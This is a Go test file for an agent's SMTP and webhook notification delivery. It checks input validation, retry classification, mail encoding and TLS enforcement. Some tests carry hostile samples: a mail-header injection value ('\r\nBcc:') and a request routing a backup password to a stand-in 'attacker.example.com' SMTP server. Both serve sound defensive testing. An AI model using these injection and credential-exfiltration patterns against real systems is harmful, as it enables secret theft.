package agent

import (
	"encoding/base64"
	"encoding/json"
	"errors"
	"mime"
	"net/http"
	"net/http/httptest"
	"net/textproto"
	"strings"
	"testing"
	"time"

	"upanel/internal/agentstore"
)

// 通知投递的测试分两层：
//   - 能在这里验的：请求校验、协议回执的分类、邮件正文的构造，以及“秘密用途不对
//     一律拒绝”这条最要紧的边界；
//   - 验不了的：真的把一封邮件投进一个真 SMTP 服务器、真的跟一个真 HTTPS 接收端
//     握手。这两件需要可信证书，只在测试虚拟机上做（tests/integration）。
// 这里不伪造那两件事，也不用“跳过 TLS 校验”来让测试跑通——那会把测的东西测没了。

func validSMTPRequest() notifyRequest {
	return notifyRequest{
		Type: "smtp",
		Settings: notifySettings{
			Host: "smtp.example.com", Port: 587, TLS: "starttls",
			From: "panel@example.com", To: []string{"ops@example.com"},
		},
		Title: "[告警] 磁盘将满",
		Body:  "规则：磁盘将满",
	}
}

func TestValidateNotifyRequest(t *testing.T) {
	cases := []struct {
		name    string
		mutate  func(*notifyRequest)
		wantSub string
	}{
		{"标题为空", func(r *notifyRequest) { r.Title = "" }, "title"},
		{"标题带换行", func(r *notifyRequest) { r.Title = "a\r\nBcc: x@y.z" }, "换行"},
		{"正文过长", func(r *notifyRequest) { r.Body = strings.Repeat("字", 4001) }, "body"},
		{"类型不认识", func(r *notifyRequest) { r.Type = "telegram" }, "type"},
		{"主机名非法", func(r *notifyRequest) { r.Settings.Host = "smtp example.com" }, "host"},
		{"端口越界", func(r *notifyRequest) { r.Settings.Port = 70000 }, "port"},
		{"没有加密模式", func(r *notifyRequest) { r.Settings.TLS = "" }, "tls"},
		{"明文模式", func(r *notifyRequest) { r.Settings.TLS = "plain" }, "tls"},
		{"发件人非法", func(r *notifyRequest) { r.Settings.From = "panel" }, "from"},
		{"收件人为空", func(r *notifyRequest) { r.Settings.To = nil }, "收件人"},
		{"收件人过多", func(r *notifyRequest) {
			r.Settings.To = make([]string, 17)
			for i := range r.Settings.To {
				r.Settings.To[i] = "a@b.c"
			}
		}, "收件人"},
		{"收件人非法", func(r *notifyRequest) { r.Settings.To = []string{"ops@"} }, "不是合法地址"},
		{"有用户名无秘密", func(r *notifyRequest) { r.Settings.Username = "panel" }, "secret_ref"},
		{"有秘密无用户名", func(r *notifyRequest) {
			r.SecretRef = "sec_0123456789abcdef0123456789abcdef"
		}, "username"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			req := validSMTPRequest()
			tc.mutate(&req)
			err := validateNotifyRequest(req)
			if err == nil {
				t.Fatal("期望被拒绝，实际通过")
			}
			if !strings.Contains(err.Error(), tc.wantSub) {
				t.Fatalf("错误里应提到 %q，实际: %v", tc.wantSub, err)
			}
		})
	}

	// 合法请求必须过。
	if err := validateNotifyRequest(validSMTPRequest()); err != nil {
		t.Fatalf("合法 smtp 请求被拒绝: %v", err)
	}
}

// TestValidateNotifyRequestWebhook：webhook 只允许 https，且不接受 userinfo 与片段。
func TestValidateNotifyRequestWebhook(t *testing.T) {
	ok := notifyRequest{Type: "webhook",
		Settings: notifySettings{URL: "https://hooks.example.com/x"},
		Title:    "t", Body: "b"}
	if err := validateNotifyRequest(ok); err != nil {
		t.Fatalf("合法 webhook 被拒绝: %v", err)
	}
	for _, u := range []string{
		"http://hooks.example.com/x",
		"https://user:pass@hooks.example.com/x",
		"https://hooks.example.com/x#frag",
		"hooks.example.com/x",
	} {
		req := ok
		req.Settings.URL = u
		if err := validateNotifyRequest(req); err == nil {
			t.Fatalf("%s 应被拒绝", u)
		}
	}
}

// TestClassifySMTPError：4xx 临时拒绝要重试，5xx 永久拒绝不重试。
func TestClassifySMTPError(t *testing.T) {
	res := classifySMTPError(&textproto.Error{Code: 451, Msg: "4.7.1 稍后再试"}, "RCPT TO 被拒绝")
	if !res.Retryable || res.Status != 451 {
		t.Fatalf("451 应可重试且带状态码，实际 %+v", res)
	}
	if !strings.Contains(res.Detail, "4.7.1") || !strings.Contains(res.Detail, "RCPT TO") {
		t.Fatalf("detail 应含对端原话与出错阶段，实际 %q", res.Detail)
	}
	res = classifySMTPError(&textproto.Error{Code: 550, Msg: "5.1.1 user unknown"}, "RCPT TO 被拒绝")
	if res.Retryable || res.Status != 550 {
		t.Fatalf("550 不该重试，实际 %+v", res)
	}
	res = classifySMTPError(&textproto.Error{Code: 535, Msg: "auth failed"}, "认证失败")
	if res.Retryable {
		t.Fatalf("认证失败不该重试，实际 %+v", res)
	}
	// 连接被拒：属于“现在连不上”，值得再试。
	if res := classifySMTPError(errors.New("dial tcp 1.2.3.4:587: connect: connection refused"), "连接失败"); !res.Retryable {
		t.Fatalf("连接失败应可重试，实际 %+v", res)
	}
}

// TestClassifyWebhookResponse：状态码到“值不值得再试”的映射。
func TestClassifyWebhookResponse(t *testing.T) {
	cases := []struct {
		status    int
		location  string
		accepted  bool
		retryable bool
	}{
		{200, "", true, false},
		{204, "", true, false},
		{301, "https://elsewhere.example.com", false, false},
		{400, "", false, false},
		{401, "", false, false},
		{404, "", false, false},
		{429, "", false, true},
		{500, "", false, true},
		{503, "", false, true},
	}
	for _, tc := range cases {
		res := classifyWebhookResponse(tc.status, tc.location, []byte("body"))
		if res.Accepted != tc.accepted || res.Retryable != tc.retryable || res.Status != tc.status {
			t.Fatalf("状态 %d 的结果不对: %+v", tc.status, res)
		}
	}
	redirect := classifyWebhookResponse(302, "https://elsewhere.example.com", nil)
	if !strings.Contains(redirect.Detail, "重定向") || !strings.Contains(redirect.Detail, "elsewhere") {
		t.Fatalf("重定向应说清且带上目标，实际 %q", redirect.Detail)
	}
}

// TestTruncateDetail：对端原话压成一行、截到上限。
func TestTruncateDetail(t *testing.T) {
	// \r 与 \n 各自变成一个空格：目标是“一行”，不是“变好看”。
	if got := truncateDetail("a\r\nb"); got != "a  b" {
		t.Fatalf("换行应被压成空格，实际 %q", got)
	}
	if got := truncateDetail("  a\n"); got != "a" {
		t.Fatalf("首尾空白应被去掉，实际 %q", got)
	}
	long := strings.Repeat("字", notifyMaxDetailLen+50)
	got := truncateDetail(long)
	if n := len([]rune(got)); n != notifyMaxDetailLen {
		t.Fatalf("截断后应为 %d 字符，实际 %d", notifyMaxDetailLen, n)
	}
	if !strings.HasSuffix(got, "…") {
		t.Fatalf("截断后应以省略号结尾，实际 %q", got[len(got)-3:])
	}
}

// TestBuildMail：邮件头齐全、正文是 UTF-8 的 base64、行宽不超过 76。
func TestBuildMail(t *testing.T) {
	req := validSMTPRequest()
	req.Body = strings.Repeat("磁盘使用率 95.5% 超过阈值 90%。", 20)
	raw := string(buildMail(req, req.Settings))

	header, body, found := strings.Cut(raw, "\r\n\r\n")
	if !found {
		t.Fatal("邮件里没有头与正文的分隔")
	}
	for _, want := range []string{
		"From: panel@example.com",
		"To: ops@example.com",
		"MIME-Version: 1.0",
		"Content-Type: text/plain; charset=utf-8",
		"Content-Transfer-Encoding: base64",
		"Subject: [告警] 磁盘将满",
	} {
		if !strings.Contains(header, want) {
			t.Fatalf("邮件头缺少 %q，实际:\n%s", want, header)
		}
	}
	// 每个 base64 行都能独立解出来，拼起来的正文与原文一致。
	var decoded strings.Builder
	for _, line := range strings.Split(strings.TrimRight(body, "\r\n"), "\r\n") {
		if len(line) > 76 {
			t.Fatalf("base64 行超过 76 字符: %d", len(line))
		}
		chunk, err := base64.StdEncoding.DecodeString(line)
		if err != nil {
			t.Fatalf("base64 行无法解码: %v", err)
		}
		decoded.Write(chunk)
	}
	if decoded.String() != req.Body {
		t.Fatalf("正文往返不一致：\n%q\n!=\n%q", decoded.String(), req.Body)
	}
}

// −−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−
// 处理端：方法、请求体、秘密用途
// −−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−−

func deliverRequest(t *testing.T, body string) *http.Request {
	t.Helper()
	req := httptest.NewRequest(http.MethodPost, "/internal/v1/notifications/deliver",
		strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	return req
}

func TestDeliverRejectsBadRequests(t *testing.T) {
	srv := newTestServer(t)

	cases := []struct {
		name   string
		method string
		body   string
		status int
	}{
		{"不是 POST", http.MethodGet, `{}`, http.StatusMethodNotAllowed},
		{"不是 JSON", http.MethodPost, `not json`, http.StatusBadRequest},
		{"未知字段", http.MethodPost, `{"type":"smtp","unknown":1}`, http.StatusBadRequest},
		{"缺标题", http.MethodPost, `{"type":"webhook","settings":{"url":"https://h.example.com/x"},"body":"b"}`,
			http.StatusBadRequest},
		{"http 回调", http.MethodPost,
			`{"type":"webhook","settings":{"url":"http://h.example.com/x"},"title":"t","body":"b"}`,
			http.StatusBadRequest},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			req := httptest.NewRequest(tc.method, "/internal/v1/notifications/deliver",
				strings.NewReader(tc.body))
			req.Header.Set("Content-Type", "application/json")
			rec := serveAs(srv, req, testWebUID)
			if rec.Code != tc.status {
				t.Fatalf("期望 %d，实际 %d：%s", tc.status, rec.Code, rec.Body.String())
			}
		})
	}
}

// TestDeliverRejectsNonNotificationSecret 是最要紧的一条边界：
//
// 面板可以拿到任意一个 secret_ref（比如备份仓库口令的引用）。如果代理只核对
// “这个引用能解开”，那么面板只要把它填进一条自己控制的 SMTP 通道，就能让代理
// 把仓库口令当 AUTH 口令发到自己的服务器上——“不能读明文”就这样被绕成“把明文
// 发给我”。所以用途必须是 notification_password，这一条由代理自己判。
func TestDeliverRejectsNonNotificationSecret(t *testing.T) {
	srv := newTestServer(t)
	secrets := srv.opts.Secrets.(*agentstore.Secrets)

	backupSecret, err := secrets.Put(reqContext(t), agentstore.PutInput{
		Purpose:   "backup_repository_password",
		Value:     []byte("仓库口令"),
		Reference: "repo:primary",
	})
	if err != nil {
		t.Fatalf("写入备份口令失败: %v", err)
	}

	body, err := json.Marshal(notifyRequest{
		Type: "smtp",
		Settings: notifySettings{
			Host: "attacker.example.com", Port: 587, TLS: "starttls",
			From: "panel@example.com", To: []string{"collect@attacker.example.com"},
			Username: "collect",
		},
		SecretRef: backupSecret.Ref,
		Title:     "t",
		Body:      "b",
	})
	if err != nil {
		t.Fatalf("序列化失败: %v", err)
	}
	rec := serveAs(srv, deliverRequest(t, string(body)), testWebUID)
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("非通知用途的秘密应被拒绝，实际 %d：%s", rec.Code, rec.Body.String())
	}
	if !strings.Contains(rec.Body.String(), "notification_password") {
		t.Fatalf("拒绝理由应点名用途，实际 %s", rec.Body.String())
	}
}

// TestDeliverNotificationSecretUnavailable：秘密被销毁之后，投递失败要说清原因，
// 而且是一个“已尝试”的失败（200 + accepted=false），不是畸形请求。
func TestDeliverNotificationSecretUnavailable(t *testing.T) {
	srv := newTestServer(t)
	secrets := srv.opts.Secrets.(*agentstore.Secrets)

	// 不带 reference 的秘密是 temporary（10 分钟后到期），正好用来演“入队之后
	// 秘密没了”这件事——比手动改库更贴近真实情形。
	secret, err := secrets.Put(reqContext(t), agentstore.PutInput{
		Purpose: "notification_password",
		Value:   []byte("smtp-secret"),
	})
	if err != nil {
		t.Fatalf("写入通知口令失败: %v", err)
	}
	if _, err := secrets.DestroyExpired(reqContext(t), time.Now().Add(24*time.Hour)); err != nil {
		t.Fatalf("销毁过期秘密失败: %v", err)
	}

	body, err := json.Marshal(notifyRequest{
		Type: "smtp",
		Settings: notifySettings{
			Host: "127.0.0.1", Port: 1, TLS: "starttls",
			From: "panel@example.com", To: []string{"ops@example.com"}, Username: "panel",
		},
		SecretRef: secret.Ref,
		Title:     "t",
		Body:      "b",
	})
	if err != nil {
		t.Fatalf("序列化失败: %v", err)
	}
	rec := serveAs(srv, deliverRequest(t, string(body)), testWebUID)
	// 销毁之后用途查询按“不存在”回答，因此是 400（拒绝），而不是假装尝试过。
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("已销毁的秘密应被拒绝，实际 %d：%s", rec.Code, rec.Body.String())
	}
}

// TestDeliverReportsSMTPFailureAsResult：对端拒绝时仍然是 200，结果在 data 里。
//
// 连一个不存在的端口：这是能稳定复现的“投递失败”，而且不需要证书。
func TestDeliverReportsSMTPFailureAsResult(t *testing.T) {
	srv := newTestServer(t)
	body, err := json.Marshal(notifyRequest{
		Type: "smtp",
		Settings: notifySettings{
			Host: "127.0.0.1", Port: 1, TLS: "starttls",
			From: "panel@example.com", To: []string{"ops@example.com"},
		},
		Title: "t",
		Body:  "b",
	})
	if err != nil {
		t.Fatalf("序列化失败: %v", err)
	}
	rec := serveAs(srv, deliverRequest(t, string(body)), testWebUID)
	if rec.Code != http.StatusOK {
		t.Fatalf("投递失败应是 200 + 结果，实际 %d：%s", rec.Code, rec.Body.String())
	}
	var env struct {
		Data notifyResponse `json:"data"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &env); err != nil {
		t.Fatalf("响应不是合法信封: %v", err)
	}
	if env.Data.Accepted {
		t.Fatal("连不上端口 1 却报成功")
	}
	if !env.Data.Retryable || env.Data.Detail == "" {
		t.Fatalf("连接失败应可重试且带原因，实际 %+v", env.Data)
	}
}

// TestDeliverRejectsWrongPeer：投递路由只有 Web 账号能调，root 不行。
//
// 这一条保证“代理向外发请求”的能力不会被 CLI 之外的路径借走。
func TestDeliverRejectsWrongPeer(t *testing.T) {
	srv := newTestServer(t)
	rec := serveAs(srv, deliverRequest(t, `{"type":"webhook","settings":{"url":"https://h.example.com/x"},"title":"t","body":"b"}`), 12345)
	if rec.Code != http.StatusForbidden {
		t.Fatalf("非 Web 账号应被拒绝，实际 %d：%s", rec.Code, rec.Body.String())
	}
}

// TestWebhookSelfSignedCertIsRejected：自签证书必须导致投递失败，而且**不重试**。
//
// 这条测试的价值在于它证明了 TLS 校验没有被关掉：如果哪天有人为了“让它跑通”
// 加了 InsecureSkipVerify，这里会变成 accepted。
func TestWebhookSelfSignedCertIsRejected(t *testing.T) {
	ts := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))
	defer ts.Close()

	res := sendWebhook(reqContext(t), notifyRequest{
		Type:     "webhook",
		Settings: notifySettings{URL: ts.URL},
		Title:    "t", Body: "b",
	}, "")
	if res.Accepted {
		t.Fatal("自签证书被接受了：TLS 校验被关掉了")
	}
	if res.Retryable {
		t.Fatalf("证书问题不该重试，实际 %+v", res)
	}
	if !strings.Contains(strings.ToLower(res.Detail), "certificate") &&
		!strings.Contains(res.Detail, "x509") {
		t.Fatalf("失败原因应指向证书，实际 %q", res.Detail)
	}
}

// 用一个已知的明文 URL 确认处理端不会替调用方“好心”升级或忽略协议。
func TestWebhookPlainHTTPNotUpgraded(t *testing.T) {
	req := validSMTPRequest()
	req.Type = "webhook"
	req.Settings = notifySettings{URL: "http://hooks.example.com/x"}
	if err := validateNotifyRequest(req); err == nil {
		t.Fatal("http 地址应被拒绝，而不是被悄悄升级成 https")
	}
	// 顺便确认邮箱地址的校验口径不会放过空域名。
	if validMailAddress("ops@") || validMailAddress("@example.com") || validMailAddress("a b@c.d") {
		t.Fatal("非法的邮件地址被接受了")
	}
	if _, _, err := mime.ParseMediaType("text/plain; charset=utf-8"); err != nil {
		t.Fatalf("mime 包不可用: %v", err)
	}
}
